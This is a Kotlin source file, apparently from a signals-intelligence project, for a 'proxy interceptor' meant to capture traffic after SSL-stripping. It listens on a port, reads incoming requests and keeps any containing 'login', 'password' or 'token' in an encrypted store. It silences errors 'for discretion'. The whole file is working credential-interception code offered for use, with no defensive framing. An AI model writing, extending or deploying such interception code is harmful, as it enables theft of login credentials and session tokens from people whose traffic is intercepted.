package com.fardc.sigint.core

import java.net.ServerSocket
import java.net.Socket
import kotlin.concurrent.thread

/**
 * MODULE PROXY-INTERCEPTOR v1.0
 * Capture les données dégradées (HTTP) après SSL-Stripping
 */
class ProxyInterceptor(private val vault: SecurityVault) {
    private var isActive = false

    fun startIntercept(listenPort: Int) {
        isActive = true
        println("📡 [PROXY] Écoute active pour capture sur le port $listenPort...")

        thread(isDaemon = true) {
            val server = ServerSocket(listenPort)
            while (isActive) {
                try {
                    val client = server.accept()
                    handleCapture(client)
                } catch (e: Exception) {
                    // Silenced pour la discrétion
                }
            }
        }
    }

    private fun handleCapture(socket: Socket) {
        thread {
            try {
                val input = socket.getInputStream().bufferedReader()
                val data = StringBuilder()
                
                // Capture des en-têtes et du corps de la requête
                var line: String? = input.readLine()
                while (!line.isNullOrEmpty()) {
                    data.append(line).append("\n")
                    line = input.readLine()
                }

                val capturedContent = data.toString()
                if (capturedContent.contains("login") || capturedContent.contains("password") || capturedContent.contains("token")) {
                    println("⚠️ [CAPTURE] Données sensibles détectées !")
                    // Chiffrement immédiat avant stockage
                    vault.encryptData("CAPTURED_BBY: $capturedContent")
                }
                
                socket.close()
            } catch (e: Exception) {}
        }
    }

    fun stop() { isActive = false }
}
